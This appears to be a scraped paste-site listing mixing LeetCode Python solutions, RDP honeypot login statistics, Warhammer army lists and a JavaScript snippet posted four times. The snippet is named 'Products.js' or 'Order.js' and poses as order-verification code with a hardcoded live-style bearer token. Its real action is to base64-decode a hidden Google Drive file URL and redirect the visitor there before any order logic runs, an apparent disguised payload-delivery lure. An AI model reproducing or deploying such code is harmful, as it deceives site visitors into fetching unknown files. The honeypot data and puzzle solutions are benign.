  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BXmPzxrm,Untitled,smj007,Python,Sunday 6th of April 2025 07:40:31 PM CDT,"TC - O(n)
SC - O(1)

class Solution:
    def productExceptSelf(self, nums: List[int]) -> List[int]:
        
        product = [1]*len(nums)

        # do a forward pass and accumulate the answers
        for i in range(1, len(nums)):
            product[i] = product[i-1]*nums[i-1]

        reverse_cum_product = 1
        # do a backward pass and accumulate the answers again
        for i in range(len(nums)-1, -1, -1):
            product[i] = product[i]*reverse_cum_product
            reverse_cum_product *= nums[i]

        return product"
gEcvY63r,Untitled,zebmekey,JavaScript,Sunday 6th of April 2025 07:36:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89311/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QWxsExiC,Products.js,zebmekey,JavaScript,Sunday 6th of April 2025 07:21:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28361/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mxUGMJPT,2025-04-05_stats.json,rdp_snitch,JSON,Sunday 6th of April 2025 07:18:26 PM CDT,"{
  ""ip"": {
    ""156.146.57.174"": 8316,
    ""138.199.24.6"": 61704,
    ""156.146.57.110"": 33315,
    ""156.146.57.52"": 8331,
    ""146.190.105.191"": 2436,
    ""138.199.24.30"": 8271,
    ""150.95.89.149"": 8313,
    ""147.182.229.114"": 555,
    ""106.14.144.233"": 429,
    ""205.210.31.193"": 9,
    ""152.32.252.94"": 3,
    ""92.255.85.92"": 6,
    ""167.94.138.57"": 3,
    ""167.94.145.111"": 3,
    ""185.42.12.86"": 9,
    ""121.134.238.166"": 3,
    ""194.180.49.123"": 9,
    ""198.235.24.52"": 9,
    ""51.255.142.174"": 24,
    ""198.12.85.87"": 3,
    ""88.214.25.121"": 6,
    ""91.238.181.93"": 6,
    ""58.218.199.219"": 15,
    ""147.185.132.22"": 9,
    ""104.152.52.137"": 3,
    ""185.242.226.23"": 3,
    ""205.210.31.206"": 9
  },
  ""asn"": {
    ""AS212238"": 49962,
    ""AS60068"": 69975,
    ""AS14061"": 2991,
    ""AS135161"": 8313,
    ""AS37963"": 429,
    ""AS396982"": 36,
    ""AS135377"": 3,
    ""AS207566"": 6,
    ""AS398324"": 3,
    ""AS398705"": 3,
    ""AS59425"": 9,
    ""AS4766"": 3,
    ""AS201814"": 9,
    ""AS16276"": 24,
    ""AS36352"": 3,
    ""AS35042"": 6,
    ""AS49434"": 6,
    ""AS4134"": 15,
    ""AS14987"": 3,
    ""AS202425"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 49962,
    ""DataCamp Limited"": 69975,
    ""DigitalOcean, LLC"": 2991,
    ""GMO-Z.COM PTE. LTD."": 8313,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Google LLC"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Censys, Inc."": 6,
    ""Korea Telecom"": 3,
    ""MEVSPACE sp. z o.o."": 9,
    ""OVH SAS"": 24,
    ""HostPapa"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""Chinanet"": 15,
    ""Rethem Hosting LLC"": 3,
    ""IP Volume inc"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 49962,
    ""Cdn77 SGP"": 69975,
    ""DigitalOcean, LLC"": 2991,
    ""Zcom Thai"": 8313,
    ""Aliyun Computing Co., LTD"": 429,
    ""Palo Alto Networks, Inc"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Censys, Inc"": 3,
    ""Censys, Inc."": 3,
    ""Horizon LLC"": 9,
    ""Kornet"": 3,
    ""HostSlick"": 9,
    ""OVH Ltd"": 24,
    ""HostPapa"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Chinanet JS"": 15,
    ""Rethem Hosting LLC"": 3,
    ""AI Spera"": 3
  },
  ""regionName"": {
    ""North West"": 119937,
    ""South West"": 2436,
    ""Tokyo"": 8313,
    ""California"": 591,
    ""Shanghai"": 429,
    ""Kowloon"": 3,
    ""Moscow"": 15,
    ""Michigan"": 6,
    ""Seoul"": 3,
    ""Bavaria"": 9,
    ""\u00cele-de-France"": 30,
    ""New York"": 3,
    ""Kowloon City"": 6,
    ""Jiangsu"": 15,
    ""Illinois"": 3,
    ""North Holland"": 3
  },
  ""country"": {
    ""Singapore"": 122373,
    ""Japan"": 8313,
    ""United States"": 603,
    ""China"": 444,
    ""Hong Kong"": 9,
    ""Russia"": 15,
    ""South Korea"": 3,
    ""Germany"": 9,
    ""France"": 30,
    ""The Netherlands"": 3
  },
  ""account"": {
    ""hello"": 131721,
    ""myZyylCLP"": 3,
    ""wsCRog"": 3,
    ""gyicAS"": 3,
    ""Administrator"": 3,
    ""Test"": 18,
    ""(empty)"": 9,
    ""Administr"": 9,
    ""fwkzqBrOF"": 3,
    ""UXgZjV"": 3,
    ""tLVOVa"": 3,
    ""UYXWPAJgF"": 3,
    ""QmoYGZ"": 3,
    ""OTxCJd"": 3,
    ""nmap"": 6,
    ""JchTFRPJE"": 3,
    ""HFxDjZ"": 3,
    ""YTnjJw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 131802
  },
  ""client_build"": {
    ""Unknown"": 131802
  },
  ""client_name"": {
    ""Unknown"": 131802
  },
  ""ip_type"": {
    ""hosting & proxy"": 123366,
    ""hosting"": 8379,
    ""proxy"": 30,
    ""Unknown"": 27
  }
}"
PpyhT53Z,2025-04-05_stats.json,rdp_snitch,JSON,Sunday 6th of April 2025 07:16:19 PM CDT,"{
  ""ip"": {
    ""156.146.57.174"": 8315,
    ""138.199.24.6"": 61703,
    ""156.146.57.110"": 33315,
    ""156.146.57.52"": 8331,
    ""146.190.105.191"": 2436,
    ""138.199.24.30"": 8271,
    ""150.95.89.149"": 8313,
    ""147.182.229.114"": 555,
    ""106.14.144.233"": 429,
    ""205.210.31.193"": 9,
    ""152.32.252.94"": 3,
    ""92.255.85.92"": 6,
    ""167.94.138.57"": 3,
    ""167.94.145.111"": 3,
    ""185.42.12.86"": 9,
    ""121.134.238.166"": 3,
    ""194.180.49.123"": 9,
    ""198.235.24.52"": 9,
    ""51.255.142.174"": 24,
    ""198.12.85.87"": 3,
    ""88.214.25.121"": 6,
    ""91.238.181.93"": 6,
    ""58.218.199.219"": 15,
    ""147.185.132.22"": 9,
    ""104.152.52.137"": 3,
    ""185.242.226.23"": 3,
    ""205.210.31.206"": 9
  },
  ""asn"": {
    ""AS212238"": 49961,
    ""AS60068"": 69974,
    ""AS14061"": 2991,
    ""AS135161"": 8313,
    ""AS37963"": 429,
    ""AS396982"": 36,
    ""AS135377"": 3,
    ""AS207566"": 6,
    ""AS398324"": 3,
    ""AS398705"": 3,
    ""AS59425"": 9,
    ""AS4766"": 3,
    ""AS201814"": 9,
    ""AS16276"": 24,
    ""AS36352"": 3,
    ""AS35042"": 6,
    ""AS49434"": 6,
    ""AS4134"": 15,
    ""AS14987"": 3,
    ""AS202425"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 49961,
    ""DataCamp Limited"": 69974,
    ""DigitalOcean, LLC"": 2991,
    ""GMO-Z.COM PTE. LTD."": 8313,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Google LLC"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Censys, Inc."": 6,
    ""Korea Telecom"": 3,
    ""MEVSPACE sp. z o.o."": 9,
    ""OVH SAS"": 24,
    ""HostPapa"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""Chinanet"": 15,
    ""Rethem Hosting LLC"": 3,
    ""IP Volume inc"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 49961,
    ""Cdn77 SGP"": 69974,
    ""DigitalOcean, LLC"": 2991,
    ""Zcom Thai"": 8313,
    ""Aliyun Computing Co., LTD"": 429,
    ""Palo Alto Networks, Inc"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Censys, Inc"": 3,
    ""Censys, Inc."": 3,
    ""Horizon LLC"": 9,
    ""Kornet"": 3,
    ""HostSlick"": 9,
    ""OVH Ltd"": 24,
    ""HostPapa"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Chinanet JS"": 15,
    ""Rethem Hosting LLC"": 3,
    ""AI Spera"": 3
  },
  ""regionName"": {
    ""North West"": 119935,
    ""South West"": 2436,
    ""Tokyo"": 8313,
    ""California"": 591,
    ""Shanghai"": 429,
    ""Kowloon"": 3,
    ""Moscow"": 15,
    ""Michigan"": 6,
    ""Seoul"": 3,
    ""Bavaria"": 9,
    ""\u00cele-de-France"": 30,
    ""New York"": 3,
    ""Kowloon City"": 6,
    ""Jiangsu"": 15,
    ""Illinois"": 3,
    ""North Holland"": 3
  },
  ""country"": {
    ""Singapore"": 122371,
    ""Japan"": 8313,
    ""United States"": 603,
    ""China"": 444,
    ""Hong Kong"": 9,
    ""Russia"": 15,
    ""South Korea"": 3,
    ""Germany"": 9,
    ""France"": 30,
    ""The Netherlands"": 3
  },
  ""account"": {
    ""hello"": 131719,
    ""myZyylCLP"": 3,
    ""wsCRog"": 3,
    ""gyicAS"": 3,
    ""Administrator"": 3,
    ""Test"": 18,
    ""(empty)"": 9,
    ""Administr"": 9,
    ""fwkzqBrOF"": 3,
    ""UXgZjV"": 3,
    ""tLVOVa"": 3,
    ""UYXWPAJgF"": 3,
    ""QmoYGZ"": 3,
    ""OTxCJd"": 3,
    ""nmap"": 6,
    ""JchTFRPJE"": 3,
    ""HFxDjZ"": 3,
    ""YTnjJw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 131800
  },
  ""client_build"": {
    ""Unknown"": 131800
  },
  ""client_name"": {
    ""Unknown"": 131800
  },
  ""ip_type"": {
    ""hosting & proxy"": 123364,
    ""hosting"": 8379,
    ""proxy"": 30,
    ""Unknown"": 27
  }
}"
wEC37Yme,2025-04-05_stats.json,rdp_snitch,JSON,Sunday 6th of April 2025 07:15:17 PM CDT,"{
  ""ip"": {
    ""156.146.57.174"": 8314,
    ""138.199.24.6"": 61702,
    ""156.146.57.110"": 33315,
    ""156.146.57.52"": 8331,
    ""146.190.105.191"": 2436,
    ""138.199.24.30"": 8271,
    ""150.95.89.149"": 8313,
    ""147.182.229.114"": 555,
    ""106.14.144.233"": 429,
    ""205.210.31.193"": 9,
    ""152.32.252.94"": 3,
    ""92.255.85.92"": 6,
    ""167.94.138.57"": 3,
    ""167.94.145.111"": 3,
    ""185.42.12.86"": 9,
    ""121.134.238.166"": 3,
    ""194.180.49.123"": 9,
    ""198.235.24.52"": 9,
    ""51.255.142.174"": 24,
    ""198.12.85.87"": 3,
    ""88.214.25.121"": 6,
    ""91.238.181.93"": 6,
    ""58.218.199.219"": 15,
    ""147.185.132.22"": 9,
    ""104.152.52.137"": 3,
    ""185.242.226.23"": 3,
    ""205.210.31.206"": 9
  },
  ""asn"": {
    ""AS212238"": 49960,
    ""AS60068"": 69973,
    ""AS14061"": 2991,
    ""AS135161"": 8313,
    ""AS37963"": 429,
    ""AS396982"": 36,
    ""AS135377"": 3,
    ""AS207566"": 6,
    ""AS398324"": 3,
    ""AS398705"": 3,
    ""AS59425"": 9,
    ""AS4766"": 3,
    ""AS201814"": 9,
    ""AS16276"": 24,
    ""AS36352"": 3,
    ""AS35042"": 6,
    ""AS49434"": 6,
    ""AS4134"": 15,
    ""AS14987"": 3,
    ""AS202425"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 49960,
    ""DataCamp Limited"": 69973,
    ""DigitalOcean, LLC"": 2991,
    ""GMO-Z.COM PTE. LTD."": 8313,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Google LLC"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Censys, Inc."": 6,
    ""Korea Telecom"": 3,
    ""MEVSPACE sp. z o.o."": 9,
    ""OVH SAS"": 24,
    ""HostPapa"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""Chinanet"": 15,
    ""Rethem Hosting LLC"": 3,
    ""IP Volume inc"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 49960,
    ""Cdn77 SGP"": 69973,
    ""DigitalOcean, LLC"": 2991,
    ""Zcom Thai"": 8313,
    ""Aliyun Computing Co., LTD"": 429,
    ""Palo Alto Networks, Inc"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Censys, Inc"": 3,
    ""Censys, Inc."": 3,
    ""Horizon LLC"": 9,
    ""Kornet"": 3,
    ""HostSlick"": 9,
    ""OVH Ltd"": 24,
    ""HostPapa"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Chinanet JS"": 15,
    ""Rethem Hosting LLC"": 3,
    ""AI Spera"": 3
  },
  ""regionName"": {
    ""North West"": 119933,
    ""South West"": 2436,
    ""Tokyo"": 8313,
    ""California"": 591,
    ""Shanghai"": 429,
    ""Kowloon"": 3,
    ""Moscow"": 15,
    ""Michigan"": 6,
    ""Seoul"": 3,
    ""Bavaria"": 9,
    ""\u00cele-de-France"": 30,
    ""New York"": 3,
    ""Kowloon City"": 6,
    ""Jiangsu"": 15,
    ""Illinois"": 3,
    ""North Holland"": 3
  },
  ""country"": {
    ""Singapore"": 122369,
    ""Japan"": 8313,
    ""United States"": 603,
    ""China"": 444,
    ""Hong Kong"": 9,
    ""Russia"": 15,
    ""South Korea"": 3,
    ""Germany"": 9,
    ""France"": 30,
    ""The Netherlands"": 3
  },
  ""account"": {
    ""hello"": 131717,
    ""myZyylCLP"": 3,
    ""wsCRog"": 3,
    ""gyicAS"": 3,
    ""Administrator"": 3,
    ""Test"": 18,
    ""(empty)"": 9,
    ""Administr"": 9,
    ""fwkzqBrOF"": 3,
    ""UXgZjV"": 3,
    ""tLVOVa"": 3,
    ""UYXWPAJgF"": 3,
    ""QmoYGZ"": 3,
    ""OTxCJd"": 3,
    ""nmap"": 6,
    ""JchTFRPJE"": 3,
    ""HFxDjZ"": 3,
    ""YTnjJw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 131798
  },
  ""client_build"": {
    ""Unknown"": 131798
  },
  ""client_name"": {
    ""Unknown"": 131798
  },
  ""ip_type"": {
    ""hosting & proxy"": 123362,
    ""hosting"": 8379,
    ""proxy"": 30,
    ""Unknown"": 27
  }
}"
3JTWpvj3,Untitled,smj007,Python,Sunday 6th of April 2025 07:13:45 PM CDT,"SC - O(n)
TC - O(n) - Booyer-Moore algo
class Solution:
    def majorityElement(self, nums: List[int]) -> int:
        """"""
        Finds the majority element in the given list using the Boyer-Moore Voting Algorithm.
        
        A majority element is an element that appears more than ⌊n/2⌋ times in the list.
        
        Algorithm:
        1. Initialize a candidate as None and count as 0.
        2. Iterate through each element in the list:
           - If count is 0, update the candidate to the current element and set count to 1.
           - If the current element matches the candidate, increment the count.
           - If the current element does not match the candidate, decrement the count.
        3. The candidate at the end of the iteration will be the majority element.

        Why This Works:
        - The algorithm pairs each candidate element with a different element and cancels them out.
        - If an element appears more than half the time (majority), it will survive the cancellation process.
        - Even if the candidate is replaced during the process, the final candidate will be the true majority 
          due to its dominance.
		""""""
        candidate = None
        count = 0

        for num in nums:
            if count == 0:
                candidate = num
                count += 1
                continue

            count = count + 1 if candidate == num else count - 1

        return candidate
        "
qyZ4Jfg8,Order.js,zebmekey,JavaScript,Sunday 6th of April 2025 07:06:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83746/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NsR3zfzA,Round 5 Jeremy,AnthTableTop,PHP,Sunday 6th of April 2025 07:00:53 PM CDT,"PLAYER NAME: Jeremy ""Curie"" Atkinson
TEAM NAME: The Eh Team
FACTIONS USED: Space Marines
TOTAL ARMY POINTS: 2000pts
WARLORD: Roboute Guilliman
ENHANCEMENT: Artificer Armour (Captain in Gravis Armour)
DETACHMENT RULE: Gladius Task Force - Combat Doctrines
+++++++++++++++++++++++++++++++++++++++++++++++

I Cast Gun (2000 points)

Space Marines
Ultramarines
Strike Force (2000 points)
Gladius Task Force


CHARACTERS

Captain in Gravis Armour (90 points)
• 1x Boltstorm gauntlet
1x Power fist
1x Relic chainsword
• Enhancement: Artificer Armour

Lieutenant with Combi-weapon (70 points)
• 1x Combi-weapon
1x Paired combat blades

Marneus Calgar (210 points)
• 1x Marneus Calgar
• 1x Gauntlets of Ultramar
• 2x Victrix Honour Guard
• 2x Victrix power sword

Roboute Guilliman (345 points)
• Warlord
• 1x Emperor’s Sword
1x Hand of Dominion


BATTLELINE

Intercessor Squad (80 points)
• 1x Intercessor Sergeant
• 1x Bolt pistol
1x Bolt rifle
1x Power fist
• 4x Intercessor
• 1x Astartes grenade launcher
4x Bolt pistol
4x Bolt rifle
4x Close combat weapon


OTHER DATASHEETS

Company Heroes (105 points)
• 1x Ancient
• 1x Bolt pistol
1x Bolt rifle
1x Close combat weapon
• 1x Company Champion
• 1x Bolt pistol
1x Master-crafted power weapon
• 2x Company Veteran
• 2x Bolt pistol
2x Close combat weapon
1x Master-crafted bolt rifle
1x Master-crafted heavy bolter

Gladiator Lancer (160 points)
• 1x Armoured hull
1x Icarus rocket pod
1x Ironhail heavy stubber
1x Lancer laser destroyer
2x Storm bolter

Gladiator Lancer (160 points)
• 1x Armoured hull
1x Icarus rocket pod
1x Ironhail heavy stubber
1x Lancer laser destroyer
2x Storm bolter

Infiltrator Squad (100 points)
• 1x Infiltrator Sergeant
• 1x Bolt pistol
1x Close combat weapon
1x Marksman bolt carbine
• 4x Infiltrator
• 4x Bolt pistol
4x Close combat weapon
1x Helix Gauntlet
1x Infiltrator Comms Array
4x Marksman bolt carbine

Storm Speeder Hammerstrike (125 points)
• 1x Close combat weapon
1x Hammerstrike missile launcher
2x Krakstorm grenade launcher
1x Melta destroyer

Vindicator (185 points)
• 1x Armoured tracks
1x Demolisher cannon
1x Hunter-killer missile
1x Storm bolter

Vindicator (185 points)
• 1x Armoured tracks
1x Demolisher cannon
1x Hunter-killer missile
1x Storm bolter

Vindicator (185 points)
• 1x Armoured tracks
1x Demolisher cannon
1x Hunter-killer missile
1x Storm bolter
"
DiVHVgGG,Round 4,AnthTableTop,PHP,Sunday 6th of April 2025 06:58:39 PM CDT,"Biosantic Broodsurge (2000 points)

Genestealer Cults
Strike Force (2000 points)
Biosanctic Broodsurge


CHARACTERS

Abominant (115 points)
• 1x Power sledgehammer
• Enhancement: Predatory Instincts

Abominant (95 points)
• 1x Power sledgehammer

Abominant (95 points)
• 1x Power sledgehammer

Biophagus (50 points)
• 1x Alchemicus Familiar
1x Autopistol
1x Chemical vials
1x Injector goad

Patriarch (100 points)
• Warlord
• 1x Patriarch’s claws
• Enhancement: Biomorph Adaptation

Reductus Saboteur (65 points)
• 1x Autopistol
1x Close combat weapon
1x Demolition charges
1x Remote explosives

Reductus Saboteur (65 points)
• 1x Autopistol
1x Close combat weapon
1x Demolition charges
1x Remote explosives


BATTLELINE

Acolyte Hybrids with Hand Flamers (70 points)
• 1x Acolyte Leader
• 1x Hand flamer
1x Leader’s bio-weapons
• 4x Acolyte Hybrid
• 1x Cult Icon
4x Cult claws and knife
3x Hand flamer

Acolyte Hybrids with Hand Flamers (70 points)
• 1x Acolyte Leader
• 1x Hand flamer
1x Leader’s bio-weapons
• 4x Acolyte Hybrid
• 1x Cult Icon
4x Cult claws and knife
3x Hand flamer

Acolyte Hybrids with Hand Flamers (70 points)
• 1x Acolyte Leader
• 1x Hand flamer
1x Leader’s bio-weapons
• 4x Acolyte Hybrid
• 1x Cult Icon
4x Cult claws and knife
3x Hand flamer

Neophyte Hybrids (65 points)
• 1x Neophyte Leader
• 1x Autopistol
1x Close combat weapon
1x Hybrid firearm
• 9x Neophyte Hybrid
• 9x Autopistol
9x Close combat weapon
1x Cult Icon
1x Grenade launcher
5x Hybrid firearm
1x Mining laser
1x Seismic cannon
1x Webber


DEDICATED TRANSPORTS

Goliath Truck (85 points)
• 1x Armoured hull
1x Demolition charge cache
1x Heavy stubber
1x Twin autocannon

Goliath Truck (85 points)
• 1x Armoured hull
1x Demolition charge cache
1x Heavy stubber
1x Twin autocannon


OTHER DATASHEETS

Aberrants (135 points)
• 1x Aberrant Hypermorph
• 1x Aberrant weapons
• 4x Aberrant
• 4x Aberrant weapons

Aberrants (135 points)
• 1x Aberrant Hypermorph
• 1x Aberrant weapons
• 4x Aberrant
• 4x Aberrant weapons

Aberrants (135 points)
• 1x Aberrant Hypermorph
• 1x Aberrant weapons
• 4x Aberrant
• 4x Aberrant weapons

Achilles Ridgerunners (85 points)
• 1x Armoured hull
1x Heavy mortar
1x Survey Augur
1x Twin heavy stubber

Achilles Ridgerunners (85 points)
• 1x Armoured hull
1x Heavy mining laser
1x Spotter
1x Twin heavy stubber

Achilles Ridgerunners (85 points)
• 1x Armoured hull
1x Heavy mining laser
1x Spotter
1x Twin heavy stubber

Hybrid Metamorphs (160 points)
• 1x Metamorph Leader
• 1x Hand flamer
1x Leader’s cult weapons
• 9x Hybrid Metamorph
• 1x Cult Icon
8x Hand flamer
9x Metamorph mutations

Purestrain Genestealers (75 points)
• 5x Purestrain Genestealer
• 5x Cult claws and talons

Purestrain Genestealers (75 points)
• 5x Purestrain Genestealer
• 5x Cult claws and talons"
9unUT5Hp,Round 3 Team Quebec,AnthTableTop,PHP,Sunday 6th of April 2025 06:57:03 PM CDT,"FACTION KEYWORD: Chaos - Chaos Daemons
+ DETACHMENT: Shadow Legion
+ TOTAL ARMY POINTS: 1990pts
+ ALLIED UNITS: Heretic Astartes
+
+ WARLORD: Char1: Be'lakor
+ ENHANCEMENT: Leaping Shadows (on Char1: Great Unclean One)
& Fade to Darkness (on Alli1: Chaos Lord)
+ NUMBER OF UNITS: 16
+ SECONDARY: - Bring It Down: (2x2) + (2x6) - Assassination: 3 Characters - Cull The Horde: 1x5
+++++++++++++++++++++++++++++++++++++++++++++++

Char1: 1x Be'lakor (375 pts): Warlord, Betraying Shades, The Blade of Shadows
Char2: 1x Great Unclean One (265 pts): Putrid vomit, Bilesword, Bileblade
Enhancement: Leaping Shadows (+15 pts)

6x Nurglings (60 pts): 6 with Diseased claws and teeth
6x Nurglings (60 pts): 6 with Diseased claws and teeth
6x Nurglings (60 pts): 6 with Diseased claws and teeth
6x Nurglings (60 pts): 6 with Diseased claws and teeth
6x Nurglings (60 pts): 6 with Diseased claws and teeth
6x Nurglings (60 pts): 6 with Diseased claws and teeth

5x Flesh Hounds (75 pts)
• 4x Flesh Hound: 4 with Collar of Khorne, Gore-drenched fangs
• 1x Gore Hound: Collar of Khorne, Burning maw, Gore-drenched fangs
5x Flesh Hounds (75 pts)
• 4x Flesh Hound: 4 with Collar of Khorne, Gore-drenched fangs
• 1x Gore Hound: Collar of Khorne, Burning maw, Gore-drenched fangs
5x Flesh Hounds (75 pts)
• 4x Flesh Hound: 4 with Collar of Khorne, Gore-drenched fangs
• 1x Gore Hound: Collar of Khorne, Burning maw, Gore-drenched fangs
1x Tzeentch Soul Grinder (180 pts): Harvester cannon, Iron claw, Warp gaze, Warpsword
1x Tzeentch Soul Grinder (180 pts): Harvester cannon, Iron claw, Warp gaze, Warpsword

Char3: 1x Chaos Lord (105 pts): Daemon hammer, Plasma pistol
Enhancement: Fade to Darkness (+15 pts)
10x Chosen (250 pts)
2 with Accursed weapon, Bolt pistol, Boltgun
4 with Accursed weapon, Bolt pistol, Combi-weapon
2 with Paired accursed weapons, Plasma pistol
1 with Boltgun, Plasma pistol, Power fist
1 with Chaos icon, Boltgun, Plasma pistol, Power fist
10x Cultist Mob (50 pts)
• 1x Cultist Champion: Brutal assault weapon, Autopistol
• 9x Cultist: 9 with Autopistol, Brutal assault weapon"
zGKrJbPL,Round 3 Dan,AnthTableTop,PHP,Sunday 6th of April 2025 06:56:09 PM CDT,"PLAYER NAME: Dan Morris
TEAM NAME: The Eh Team
FACTIONS USED: Aeldari
TOTAL ARMY POINTS: 2000
WARLORD: Yncarne
ENHANCEMENT:
DETACHMENT RULE: Devoted of Ynnead
+++++++++++++++++++++++++++++++++++++++++++++++


https://www.youtube.com/watch?v=5hTMYk7orHw&ab_channel=Gojira

!! aspect host2 (1990 points)

Aeldari
Strike Force (2000 points)
Devoted of Ynnead


CHARACTERS

Autarch (75 points)
• 1x Dragon fusion gun
1x Star glaive

Autarch (75 points)
• 1x Dragon fusion pistol
1x Star glaive

The Yncarne (250 points)
• Warlord
• 1x Swirling soul energy
1x Vilith-zhar


BATTLELINE

Corsair Voidreavers (60 points)
• 1x Voidreaver Felarch
• 1x Close combat weapon
1x Mistshield
1x Power sword
1x Shuriken rifle
• 4x Corsair Voidreaver
• 1x Blaster
4x Close combat weapon
3x Shuriken rifle


DEDICATED TRANSPORTS

Wave Serpent (125 points)
• 1x Shuriken cannon
1x Twin bright lance
1x Wraithbone hull


OTHER DATASHEETS

Dark Reapers (90 points)
• 1x Aspect Shrine Token
• 1x Dark Reaper Exarch
• 1x Close combat weapon
1x Missile launcher
• 4x Dark Reaper
• 4x Close combat weapon
4x Reaper launcher

Dark Reapers (90 points)
• 1x Aspect Shrine Token
• 1x Dark Reaper Exarch
• 1x Close combat weapon
1x Missile launcher
• 4x Dark Reaper
• 4x Close combat weapon
4x Reaper launcher

